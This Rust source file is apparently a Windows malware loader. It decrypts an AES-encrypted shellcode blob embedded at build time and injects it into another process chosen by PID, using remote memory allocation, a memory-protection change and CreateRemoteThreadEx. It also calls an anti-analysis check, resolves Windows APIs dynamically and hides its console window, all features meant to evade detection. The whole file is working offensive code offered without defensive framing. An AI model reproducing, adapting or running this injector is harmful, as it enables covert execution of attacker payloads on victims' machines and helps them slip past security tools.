#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod anti_analysis;

use std::env;
use dynamic_winapi::um::{
    processthreadsapi::{CreateRemoteThreadEx, OpenProcess},
    memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
};
use winapi::ctypes::c_void;
use winapi::um::winnt::{
    MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS,
};
type Aes128Cfb = Cfb<Aes128>;
use aes::{Aes128};
use cfb_mode::Cfb;
use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
use winapi::shared::minwindef::DWORD;

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
static AES_KEY: [u8; 16] = *include_bytes!("../aes.key");
static AES_IV: [u8; 16] = *include_bytes!("../aes.iv");

fn decrypt_shellcode_stub() -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
    let mut buf = SHELLCODE.to_vec();
    cipher.decrypt(&mut buf);
    buf
}

fn main()->Result<(),Box<dyn std::error::Error>> {

    anti_analysis::detect();
    let ppid:Vec<String> =  env::args().collect();
    let pid = ppid[1].parse::<DWORD>().unwrap();
    let mut shellcodeDec = decrypt_shellcode_stub();
    let shellcode_ptr: *mut c_void = shellcodeDec.as_mut_ptr() as *mut c_void;

    // get process handle
    let handle = unsafe {OpenProcess().unwrap()(
        PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // alloc payload
    let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
        handle,
        0 as _,
        shellcodeDec.len(),
        MEM_COMMIT,
        PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {WriteProcessMemory().unwrap()(
        handle,
        addr_shellcode,
        shellcode_ptr,
        shellcodeDec.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {VirtualProtectEx().unwrap()(
        handle,
        addr_shellcode,
        shellcodeDec.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {CreateRemoteThreadEx().unwrap()(
        handle,
        0 as _,
        0,
        std::mem::transmute(addr_shellcode),
        0 as _,
        0,
        0 as _,
        0 as _
    )};

    Ok(())
}
